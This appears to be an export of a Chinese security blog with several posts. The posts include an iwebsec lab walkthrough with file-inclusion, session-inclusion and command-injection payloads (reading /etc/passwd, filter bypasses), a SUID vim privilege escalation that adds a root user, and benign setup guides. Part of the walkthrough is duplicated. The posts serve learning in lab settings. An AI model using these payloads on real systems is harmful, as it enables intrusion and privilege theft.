<p>然后就能更好的利用session本地文件包含</p>
<p>session路径：</p>
<p>Linux：</p>
<p>　　在这里的docker镜像中，php版本是PHP Version 5.2.17。session路径一般是/var/lib/php/session/</p>
<img src="1503868-20200906232554554-1264704935.png" alt loading="lazy">

<p> </p>
<p> windows：</p>
<p>　　像我用的phpstudy一键搭建的环境，php版本为PHP  5.4.45。session路径是E:\phpStudy\PHPTutorial\tmp\tmp</p>
<p>　　<img src="1503868-20200906233319545-1011432297.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p>session_start()解释：<br>1.session的工作原理<br>（1）首先使用session_start()函数进行初始换</p>
<p>（2）当执行PHP脚本时，通过使用SESSION超全局变量注册session变量。</p>
<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。2.sessionstart()做了哪些初始化工作（1）读取名为PHPSESSID（如果没有改变默认值）的cookie值，假使为abc123。（2.1）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以再php.ini中设置）读取SESSabc123（默认是这种命名方式）文件,将字符装在入SESSION变量中;（2.2） 若没有读取到PHPSESSID这个COOKIE，也会创建S​ESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件,同时将abc321作为PHPSESSID的cookie值返回给浏览器端。</p>
<p>漏洞分析<br>此php会将获取到的GET型ctfs变量的值存入到session中。当访问<a class="link" href="http://www.ctfs-wiki/session.php?ctfs=ctfs">http://www.ctfs-wiki/session.php?ctfs=ctfs<i class="fas fa-external-link-alt"></i></a> 后，会在/var/lib/php/session目录下存储session的值。session的文件名为sess+sessionid，sessionid可以通过在浏览器F12的网络中获取</p>
<p>这里payload为<a href="http://xx.xx.xx.xx:xx/fi/03.php?iwebsec=&lt;?phpphpinfo()">http://xx.xx.xx.xx:xx/fi/03.php?iwebsec=&lt;?phpphpinfo()</a>;?&gt;</p>
<p>F12查看cookies中的PHPSESSID为dg4cqgdu1t7t7a9nb375169qr0</p>
<img src="1503868-20200908124221960-850820530.png" width="1000" loading="lazy">

<p> </p>
<p>进入服务器查看文件</p>
<img src="1503868-20200908124552679-1419438010.png" alt loading="lazy">

<p> </p>
<p> 　　`1q2w3wwewq2e23</p>
<p> 成功写入</p>
<p>用之前的本地文件包含漏洞读取这个文件</p>
<p>payload:<a href="http://xx.xx.xx.xx:xx/fi/01.php?filename=../../../../var/lib/php/session/sess_dg4cqgdu1t7t7a9nb375169qr0">http://xx.xx.xx.xx:xx/fi/01.php?filename=../../../../var/lib/php/session/sess_dg4cqgdu1t7t7a9nb375169qr0</a></p>
<img src="1503868-20200908130359402-1720143403.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<ul>
<li>php://filter伪协议</li>
<li>php://input伪协议</li>
<li>file://伪协议利用</li>
<li>data://伪协议利用</li>
</ul>
<p><strong>命令执行</strong> </p>
<p><strong>1、</strong></p>
 <img src="1503868-20210113215458099-478559894.png" width="1000" loading="lazy">

<p> </p>
<p>url:<a class="link" href="http://ip:32110/exec/01.php?ip=127.0.0.1">http://ip:32110/exec/01.php?ip=127.0.0.1<i class="fas fa-external-link-alt"></i></a></p>
<p>可以猜测是ifconfig ip</p>
<p>在后面加上 ; 分隔开</p>
<p><a class="link" href="http://ip:32110/exec/01.php?ip=127.0.0.1;cat">http://ip:32110/exec/01.php?ip=127.0.0.1;cat<i class="fas fa-external-link-alt"></i></a> /etc/passwd</p>
<img src="1503868-20210113215657902-469851191.png" width="1000" loading="lazy">

<p> </p>
<p><strong>2、</strong></p>
<p>第二个是空格绕过，如果参数中出现了空格，直接报error</p>
<p>URL：<a class="link" href="http://ip:32110/exec/02.php?ip=127.0.0.1;cat%20/etc/passwd">http://IP:32110/exec/02.php?ip=127.0.0.1;cat%20/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20210113220529825-605193088.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p>在linux bash中可以用以下几个符号代替空格</p>
<p>&lt;</p>
<p>${IFS}</p>
<p>$IFS$9</p>
<img src="1503868-20210113220336958-523652881.png" alt loading="lazy">

<p>如果是PHP环境，也可以用%09</p>
<p>URL：<a class="link" href="http://ip:32110/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd">http://IP:32110/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20210113220412739-437139119.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p><strong>3、</strong></p>
<p>第三个是黑名单，关键命令绕过</p>
<img src="1503868-20210113220842357-138091093.png" alt loading="lazy">

<p> </p>
<p>cat命令被拉进黑名单了</p>
<p>用a=ca;b=t;$a$b /etc/passwd绕过。</p>
<p> URL：<a class="link" href="http://ip:32110/exec/03.php?ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd">http://IP:32110/exec/03.php?ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p> </p>
<p><strong>4、</strong></p>
<p> </p>
<p><strong>5、</strong></p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p><strong>代码执行</strong></p>
<p>  留坑</p>
<p><strong>xss</strong></p>
<p>  留坑</p>
<p><strong>SSRF</strong></p>
<p>  留坑</p>
<p><strong>XXE</strong></p>
<p>  留坑</p>
<p><strong>反序列化</strong></p>
<p>  留坑 </p>
<p><strong>中间件漏洞</strong></p>
<p>  留坑 </p>
<p><strong>解析漏洞</strong></p>
<p>  留坑</p>
<p><strong>数据库漏洞</strong></p>
<p> 留坑</p>
<p> </p>
<p>————恢复内容开始————</p>
<p><strong>file=php://filter/read=convert.base64-encode/resource=index.php<br><br>SQL注入</strong></p>
<p> 留坑</p>
<p><strong>文件上传</strong></p>
<p> 留坑</p>
<p><strong>文件包含</strong></p>
<p> 1、<a href="http://xx:xx:xx:xx:xx/fi/01.php">http://xx:xx:xx:xx:xx/fi/01.php</a></p>
<p><a href="http://xx:xx:xx:xx:xx/fi/01.php?filename=../../../../etc/passwd">http://xx:xx:xx:xx:xx/fi/01.php?filename=../../../../etc/passwd</a></p>
<img src="1503868-20200906145155823-157903361.png" width="1000" loading="lazy">

<p> </p>
<p>用../不断返回上一层，然后重新打开敏感文件</p>
<p>Linux/Unix系统：<br><br>    /etc/passwd // 账户信息<br><br>    /etc/shadow // 账户密码文件<br><br>    /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br><br>    /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br><br>    /usr/local/app/php5/lib/php.ini // PHP相关配置<br><br>    /etc/httpd/conf/httpd.conf // Apache配置文件<br><br>    /etc/my.conf // mysql 配置文件<br><br></p>
<p>Windows系统：<br><br>    c:\boot.ini // 查看系统版本<br><br>    c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br><br>    c:\windows\repair\sam // 存储Windows系统初次安装的密码<br><br>    c:\ProgramFiles\mysql\my.ini // MySQL配置<br><br>    c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br><br>    c:\windows\php.ini // php 配置信息<br>还可以参考：<a class="link" href="https://blog.csdn.net/doulicau/article/details/106683724">https://blog.csdn.net/doulicau/article/details/106683724<i class="fas fa-external-link-alt"></i></a>　</p>
<p>灵活使用</p>
<p>2、<a href="http://xx:xx:xx:xx:xx/fi/02.php">http://xx:xx:xx:xx:xx/fi/02.php</a></p>
<p>（1）：%00截断</p>
<p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4）</p>
<p><a href="http://xx:xx:xx:xx:xx/fi/02.php?filename=../../../../etc/passwd%00">http://xx:xx:xx:xx:xx/fi/02.php?filename=../../../../etc/passwd%00</a></p>
<p>同时放上一些其他的截断方法</p>
<p>（2）路径长度截断</p>
<p>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
<p>EXP</p>
<p>（3）点号截断</p>
<p>条件：windows OS，点号需要长于256</p>
<p>EXP</p>
<p>参考自：<a class="link" href="https://blog.csdn.net/Vansnc/article/details/82528395">https://blog.csdn.net/Vansnc/article/details/82528395<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p> </p>
<p> 3、<a href="http://xx.xx.xx.xx:xx/fi/03.php">http://xx.xx.xx.xx:xx/fi/03.php</a></p>
<p>session本地文件包含</p>
<p>前提需要一个本地文件包含，比如iwebsec中的前面两个</p>
<p>然后就能更好的利用session本地文件包含</p>
<p>session路径：</p>
<p>Linux：</p>
<p>　　在这里的docker镜像中，php版本是PHP Version 5.2.17。session路径一般是/var/lib/php/session/</p>
<img src="1503868-20200906232554554-1264704935.png" alt loading="lazy">

<p> </p>
<p> windows：</p>
<p>　　像我用的phpstudy一键搭建的环境，php版本为PHP  5.4.45。session路径是E:\phpStudy\PHPTutorial\tmp\tmp</p>
<p>　　<img src="1503868-20200906233319545-1011432297.png" alt loading="lazy"></p>
<p> </p>
<p> </p>
<p>session_start()解释：<br>1.session的工作原理<br>（1）首先使用session_start()函数进行初始换</p>
<p>（2）当执行PHP脚本时，通过使用SESSION超全局变量注册session变量。</p>
<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。2.sessionstart()做了哪些初始化工作（1）读取名为PHPSESSID（如果没有改变默认值）的cookie值，假使为abc123。（2.1）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以再php.ini中设置）读取SESSabc123（默认是这种命名方式）文件,将字符装在入SESSION变量中;（2.2） 若没有读取到PHPSESSID这个COOKIE，也会创建S​ESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件,同时将abc321作为PHPSESSID的cookie值返回给浏览器端。</p>
<p>漏洞分析<br>此php会将获取到的GET型ctfs变量的值存入到session中。当访问<a class="link" href="http://www.ctfs-wiki/session.php?ctfs=ctfs">http://www.ctfs-wiki/session.php?ctfs=ctfs<i class="fas fa-external-link-alt"></i></a> 后，会在/var/lib/php/session目录下存储session的值。session的文件名为sess+sessionid，sessionid可以通过在浏览器F12的网络中获取</p>
<p>这里payload为<a href="http://xx.xx.xx.xx:xx/fi/03.php?iwebsec=&lt;?phpphpinfo()">http://xx.xx.xx.xx:xx/fi/03.php?iwebsec=&lt;?phpphpinfo()</a>;?&gt;</p>
<p>F12查看cookies中的PHPSESSID为dg4cqgdu1t7t7a9nb375169qr0</p>
<img src="1503868-20200908124221960-850820530.png" width="1000" loading="lazy">

<p> </p>
<p>进入服务器查看文件</p>
<img src="1503868-20200908124552679-1419438010.png" alt loading="lazy">

<p> </p>
<p> 　　`1q2w3wwewq2e23</p>
<p> 成功写入</p>
<p>用之前的本地文件包含漏洞读取这个文件</p>
<p>payload:<a href="http://xx.xx.xx.xx:xx/fi/01.php?filename=../../../../var/lib/php/session/sess_dg4cqgdu1t7t7a9nb375169qr0">http://xx.xx.xx.xx:xx/fi/01.php?filename=../../../../var/lib/php/session/sess_dg4cqgdu1t7t7a9nb375169qr0</a></p>
<img src="1503868-20200908130359402-1720143403.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<ul>
<li>php://filter伪协议</li>
<li>php://input伪协议</li>
<li>file://伪协议利用</li>
<li>data://伪协议利用</li>
</ul>
<p><strong>命令执行</strong> </p>
<p><strong>1、</strong></p>
 <img src="1503868-20210113215458099-478559894.png" width="1000" loading="lazy">

<p> </p>
<p>url:<a class="link" href="http://ip:32110/exec/01.php?ip=127.0.0.1">http://ip:32110/exec/01.php?ip=127.0.0.1<i class="fas fa-external-link-alt"></i></a></p>
<p>可以猜测是ifconfig ip</p>
<p>在后面加上 ; 分隔开</p>
<p><a class="link" href="http://ip:32110/exec/01.php?ip=127.0.0.1;cat">http://ip:32110/exec/01.php?ip=127.0.0.1;cat<i class="fas fa-external-link-alt"></i></a> /etc/passwd</p>
<img src="1503868-20210113215657902-469851191.png" width="1000" loading="lazy">

<p> </p>
<p><strong>2、</strong></p>
<p>第二个是空格绕过，如果参数中出现了空格，直接报error</p>
<p>URL：<a class="link" href="http://ip:32110/exec/02.php?ip=127.0.0.1;cat%20/etc/passwd">http://IP:32110/exec/02.php?ip=127.0.0.1;cat%20/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20210113220529825-605193088.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p>在linux bash中可以用以下几个符号代替空格</p>
<p>&lt;</p>
<p>${IFS}</p>
<p>$IFS$9</p>
<img src="1503868-20210113220336958-523652881.png" alt loading="lazy">

<p>如果是PHP环境，也可以用%09</p>
<p>URL：<a class="link" href="http://ip:32110/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd">http://IP:32110/exec/02.php?ip=127.0.0.1;cat%09/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20210113220412739-437139119.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p><strong>3、</strong></p>
<p>第三个是黑名单，关键命令绕过</p>
<img src="1503868-20210113220842357-138091093.png" alt loading="lazy">

<p> </p>
<p>cat命令被拉进黑名单了</p>
<p>用a=ca;b=t;$a$b /etc/passwd绕过。</p>
<p> URL：<a class="link" href="http://ip:32110/exec/03.php?ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd">http://IP:32110/exec/03.php?ip=127.0.0.1;a=ca;b=t;$a$b%20/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p> </p>
<p><strong>4、</strong></p>
<p> </p>
<p><strong>5、</strong></p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p><strong>代码执行</strong></p>
<p>  留坑</p>
<p><strong>xss</strong></p>
<p>  留坑</p>
<p><strong>SSRF</strong></p>
<p>  留坑</p>
<p><strong>XXE</strong></p>
<p>  留坑</p>
<p><strong>反序列化</strong></p>
<p>  留坑 </p>
<p><strong>中间件漏洞</strong></p>
<p>  留坑 </p>
<p><strong>解析漏洞</strong></p>
<p>  留坑</p>
<p><strong>数据库漏洞</strong></p>
<p> 留坑</p>
<p> </p>
<p>————恢复内容结束————</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>linux 配置crawlergo_xray</title>
    <url>/2020/10/06/linux%20%E9%85%8D%E7%BD%AEcrawlergo_xray-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13773847.html">源地址：https://www.cnblogs.com/This-is-Y/p/13773847.html<i class="fas fa-external-link-alt"></i></a></p>
<p>用的是阿里云学生机服务器，ubuntu系统</p>
<p>先安装一个chromium内核，参考：<a class="link" href="https://blog.csdn.net/sdujava2011/article/details/50880663">https://blog.csdn.net/sdujava2011/article/details/50880663<i class="fas fa-external-link-alt"></i></a></p>
<p>32位：</p>
<p>　　下载：wget <a class="link" href="https://dl.google.com/linux/direct/google-chrome-stable_current_i386.deb">https://dl.google.com/linux/direct/google-chrome-stable_current_i386.deb<i class="fas fa-external-link-alt"></i></a></p>
<p>　　安装：sudo dpkg -i google-chrome-stable_current_i386.deb</p>
<p>64位：</p>
<p>　　下载：wget <a class="link" href="https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb">https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb<i class="fas fa-external-link-alt"></i></a></p>
<p>　　安装：sudo dpkg -i google-chrome-stable_current_amd64.deb</p>
<p>新方法，直接：sudo apt-get install chromium-browser，然后等着就行了，</p>
<p>然后找到路径：</p>
<p>which ch(双击Tab键）（主要为了确认安装是否成功）</p>
<p>然后填补</p>
<p>which chromium</p>
<p>比如我的是这样子的(路径记下来，有用的）</p>
<img src="1503868-20201006163435899-533612440.png" alt loading="lazy">

<p>之后下载python，确保有这些库</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install queue</span><br><span class="line">pip install simplejson</span><br><span class="line">pip install threading</span><br><span class="line">pip install subprocess</span><br><span class="line">pip install requests</span><br><span class="line">pip install warnings</span><br><span class="line">pip install fake_useragent</span><br></pre></td></tr></table></figure>

<img src="1503868-20201006165325415-1451011024.png" alt loading="lazy">

<p> 测试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> simplejson</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br></pre></td></tr></table></figure>

<p> </p>
<p>然后clone原作者的项目<a class="link" href="https://github.com/timwhitez/crawlergo_x_XRAY">https://github.com/timwhitez/crawlergo_x_XRAY<i class="fas fa-external-link-alt"></i></a></p>
<p>git clone <a class="link" href="https://github.com/timwhitez/crawlergo_x_XRAY.git">https://github.com/timwhitez/crawlergo_x_XRAY.git<i class="fas fa-external-link-alt"></i></a></p>
<p>之后的crawlergo 和xray我是选择手动下载在上传到服务器中的</p>
<p>crawlergo：<a class="link" href="https://github.com/0Kee-Team/crawlergo/tags">https://github.com/0Kee-Team/crawlergo/tags<i class="fas fa-external-link-alt"></i></a></p>
<p>xray：<a class="link" href="https://github.com/chaitin/xray/tags">https://github.com/chaitin/xray/tags<i class="fas fa-external-link-alt"></i></a></p>
<p>注意选择linux版本,arm和amd区别开</p>
<p> </p>
<p>crawlergo文件放在和launch.py同目录下</p>
<p>xray的位置随意，推荐放在crawlergo_x_XRAY里面</p>
<p> </p>
<p>上传到服务器后，有可能无法运行，chmod 777 给一下权限</p>
<p> </p>
<p>测试一下能不能用</p>
<p>crawlergo：  ./crawlergo -c [chromium路径] -t [最大标签页数] [目标网址]</p>
<p>　　　　　　./crawlergo -c /snap/bin/chromium -t 5 <a class="link" href="http://www.baidu.com/">http://www.baidu.com<i class="fas fa-external-link-alt"></i></a></p>
<p>可以正常运行：</p>
<img src="1503868-20201006164321382-1970100337.png" alt loading="lazy">

<p> 新版本作者加了fake_location,不过我的有些问题，一直提示Maximum amount of retries reached</p>
<p>把ua那段改一下就没事了，不知道会不会有别的啥影响</p>
<img src="image-20210514150610636.png" alt loading="lazy">


<p> xray ：./xray_linux_amd64 version</p>
<p>可以正常运行：</p>
<img src="1503868-20201006164629312-162244452.png" alt loading="lazy">

<p> </p>
<p> 　　</p>
<p>之后vim打开launch.py</p>
<p>找到这一行</p>
<img src="1503868-20201006164754246-454793614.png" alt loading="lazy">

<p> </p>
<p> 修改为chromium的路径</p>
<p>:wq保存退出</p>
<p> </p>
<p> </p>
<p>直接测试运行一下</p>
<p>xray： ./xray_linux_amd64 webscan –listen 127.0.0.1:7777 –html-output test_1.html</p>
<p>python3 launcher.py</p>
<p>可能会比较久</p>
<img src="1503868-20201006165813532-1057363777.png" alt loading="lazy">

<img src="1503868-20201006165818106-907686948.png" alt loading="lazy">

<p> ~~开始写代码</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>kali安装vmtool后依旧无法拖拽文件，复制粘贴，解决办法</title>
    <url>/2019/09/16/kali%E5%AE%89%E8%A3%85vmtool%E5%90%8E%E4%BE%9D%E6%97%A7%E6%97%A0%E6%B3%95%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%EF%BC%8C%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11526221.html">源地址：https://www.cnblogs.com/This-is-Y/p/11526221.html<i class="fas fa-external-link-alt"></i></a></p>
<p>本文链接：<a class="link" href="https://blog.csdn.net/Key_book/article/details/80310235">https://blog.csdn.net/Key_book/article/details/80310235<i class="fas fa-external-link-alt"></i></a><br>命令行下</p>
<p>执行</p>
<p>apt-get install open-vm-tools-desktop fuse</p>
<p>以安装open-vm-tools</p>
<p>部分提示安装错误，找不到指定目录，附上解决方法：<br>需要添加更新源。</p>
<p>下面是清华的更新源，大家也可以百度其他<br>deb <a class="link" href="http://mirrors.tuna.tsinghua.edu.cn/kali/">http://mirrors.tuna.tsinghua.edu.cn/kali/<i class="fas fa-external-link-alt"></i></a> kali-rolling contrib main non-free</p>
<p>1.终端输入：vi /etc/apt/sources.list</p>
<p>打开后把上面的源加进去，然后把kali的源注释掉，行首加#</p>
<p>（这段如果不会可以上网查  vim命令）</p>
<p>2.更新系统和软件</p>
<p>apt-get update &amp;&amp; apt-get upgrade</p>
<p>3.安装vmtools</p>
<p>apt-get install open-vm-tools-desktop fuse</p>
<p>4.重启虚拟机reboot<br><br></p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>jsp与eclipse对接</title>
    <url>/2020/09/07/jsp%E4%B8%8Eeclipse%E5%AF%B9%E6%8E%A5-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13629909.html">源地址：https://www.cnblogs.com/This-is-Y/p/13629909.html<i class="fas fa-external-link-alt"></i></a></p>
<p>先安装好tomcat，双击运行startup.bat启动后，浏览器输入127.0.0.1:8080出现了这只超丑的猫后即配置正常</p>
<img src="1503868-20200907230207551-369076692.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p>然后关掉服务</p>
<p> </p>
<p>打开eclipse，窗口-&gt;首选项</p>
<img src="1503868-20200907230306446-1642999374.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 搜索runtime，找到runtime environment，点添加</p>
<img src="1503868-20200907230354718-718380580.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 找到自己安装好的版本，下一步</p>
<img src="1503868-20200907230530225-590582225.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 确定路径，选择jre，完成</p>
<img src="1503868-20200907230551064-44944959.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 最后保存退出</p>
<p> </p>
<p>新建文件-&gt;Dynamic web Project</p>
<img src="1503868-20200907230716063-329426504.png" alt loading="lazy">

<p> </p>
<p> </p>
<p>起名：testtttt</p>
<img src="1503868-20200907230923525-1784495570.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 然后选择版本，路径，JRE</p>
<img src="1503868-20200907231239549-1656407563.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 之后下一步，到这里点上Generate web.xml deployment descriptor</p>
<img src="1503868-20200907231346535-1892396403.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 之后在左边可以看到testtttt，jsp文件写在WebContent下面</p>
<img src="1503868-20200907231507947-1461537134.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 各个目录解释；</p>
<ul>
<li>deployment descriptor：部署的描述。</li>
<li>build：放入编译之后的文件。</li>
<li>WebContent:放进写入的页面。</li>
</ul>
<p> </p>
<p>创建一个testttt.jsp文件在WebContent下</p>
<img src="1503868-20200907231922353-1329783924.png" alt loading="lazy">

<p> </p>
<p> 写入代码</p>
<p>保存，</p>
<p>在窗口-&gt;Web Brower中选择浏览器</p>
<img src="1503868-20200907232023334-133616223.png" alt loading="lazy">

<p> </p>
<p> </p>
<p>运行-&gt;运行方式  -&gt;Run on Server</p>
<img src="1503868-20200907232119753-928200054.png" alt loading="lazy">

<p> </p>
<p> 跳出来的不需要配置，下一步就好了</p>
<p>运行成功结果如下</p>
<img src="1503868-20200907232331495-1124772426.png" width="1000" loading="lazy">

<p> </p>
<p> 要在浏览器访问这个页面</p>
<p><a class="link" href="http://127.0.0.1:8080/testtttt/testttt.jsp">http://127.0.0.1:8080/testtttt/testttt.jsp<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p>参考自菜鸟教程：<a class="link" href="https://www.runoob.com/jsp/eclipse-jsp.html">https://www.runoob.com/jsp/eclipse-jsp.html<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>linux 通过suid vim.basic文件提权</title>
    <url>/2020/06/30/linux%20%E9%80%9A%E8%BF%87suid%20vim.basic%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13211224.html">源地址：https://www.cnblogs.com/This-is-Y/p/13211224.html<i class="fas fa-external-link-alt"></i></a></p>
<p>在kali上复现</p>
<p>先给需要的vim.basic文件设置suid权限</p>
<p>chmod u+s /usr/bin/vim.basic</p>
<p>先adduser test1一个普通权限用户</p>
<p>现在就是一个合适的提权环境</p>
<p>通过以下命令可以找到存在suid权限的文件</p>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} \；</p>
<p>可用于提权的文件有</p>
<ul>
<li>nmap</li>
<li>vim</li>
<li>find</li>
<li>bash</li>
<li>more</li>
<li>less</li>
<li>nano</li>
<li>cp</li>
</ul>
<img src="1503868-20200629233141311-1416832293.png" alt loading="lazy">

<p> </p>
<p> 利用vim提权的思路是修改etc/passwd文件，为自己添加一个有root权限的用户</p>
<p>passwd文件用户格式为：用户名:密码:uid:gid:注释:home目录:用户的shell</p>
<p>这边可以看看root用户的格式</p>
<p>root:x:0:0:root:/root:/bin/bash</p>
<p>（密码这部分之所以是x，是因为真正的密码存在/etc/shadow文件里）</p>
<img src="1503868-20200629233603504-1537448535.png" alt loading="lazy">

<p> </p>
<p>生成密码：用openssl passwd -1 –salt asd 123  （这里是-1（数字1）不是L）</p>
<p>直接写在passwd文件里面，</p>
<img src="1503868-20200629235203897-1099154171.png" alt loading="lazy">

<p> </p>
<p> toor:$1$asd$sTMDZlRI6L.jJEw2I.3x8.:0:0:root:/toor:/bin/bash</p>
<p>用vim /etc/passwd可以修改，但是在保存是会出现E212，无法保存，提示我们没有权限修改这个</p>
<img src="1503868-20200629235903572-1576856707.png" alt loading="lazy">

<p>这时应该用之前find找到的vim.basic文件运行，这个程序是有suid权限的。绝对可以修改</p>
<p>vim.basic /etc/passwd</p>
<p>用这个打开，然后修改文件，就可以成功保存</p>
<img src="1503868-20200629235613872-1996231369.png" alt loading="lazy">

<p> </p>
<p>可以看到已经添加了，su toor切换，密码123，再id查看一下权限</p>
 <img src="1503868-20200629235703917-1989192327.png" alt loading="lazy">

<p> </p>
<p> root权限</p>
<p> </p>
<p>chmod u+s /usr/bin/vim.basic</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>linux 下重定向的注意事项</title>
    <url>/2022/04/23/linux-%E4%B8%8B%E9%87%8D%E5%AE%9A%E5%90%91%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-This-is-Y/</url>
    <content><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p>​    重定向输出通常使用<code>&gt;</code>和<code>&gt;&gt;</code></p>
<ul>
<li><code>&gt;</code>    覆盖</li>
<li><code>&gt;&gt;</code>  追加</li>
</ul>
<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p>​    在linux的重定向中: 0  1  2代表着不同的涵义。</p>
<ul>
<li><p>0表示标准输入。</p>
</li>
<li><p>1标准输出。</p>
</li>
<li><p>2标准错误信息输出。</p>
<p>  通过指明0/1/2来指定需要重定向内容是标准输入/标准输出/标准错误信息输出。默认重定向的内容是1（标准输出）。</p>
</li>
</ul>
<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p>某些快捷键</p>
<ul>
<li><p>ctrl + z<br> 可以将一个正在前台执行的命令放到后台，并且处于<strong>暂停</strong>状态。</p>
</li>
<li><p>Ctrl+c<br> 终止前台命令。</p>
</li>
</ul>
<h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><p>&amp; 和 nohup</p>
<ul>
<li><p>&amp; </p>
<p>在命令后面加上&amp; 实现后台运行，<strong>把当前控制台关掉(退出帐户时)，作业就会停止运行。</strong></p>
</li>
<li><p>nohup</p>
<p>( no hang up) 在命令前加上nohup实现后台运行，<strong>退出帐户之后继续运行相应的进程，非正常退出会导致结束，需要使用exit</strong></p>
</li>
<li><p>jobs</p>
<p>可以查看当前在后台的进程，配合使用kill %num 可以中止选择的进程</p>
</li>
</ul>
<h1 id="5-实例python代码"><a href="#5-实例python代码" class="headerlink" title="5 实例python代码"></a>5 实例python代码</h1><h2 id="1-py"><a href="#1-py" class="headerlink" title="1.py"></a>1.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>普通的挂在后台</p>
<ul>
<li>python 1.py &amp;</li>
</ul>
<p>虽然这时候可以自己输入命令，但是该进程的输出会一直跑出来</p>
<p><img src="image-20220423130621470.png" alt="image-20220423130621470"></p>
<p>所以需要把输出重定向到文件中。但是如果👇这样子写的话，在程序跑完前，在1.out输出文件中是不会有任何东西的</p>
<ul>
<li>python 1.py  &gt; 1.out &amp;</li>
</ul>
<p>所以需要加上 -u 参数</p>
<ul>
<li>python <strong>-u</strong> 1.py  &gt; 1.out &amp;</li>
</ul>
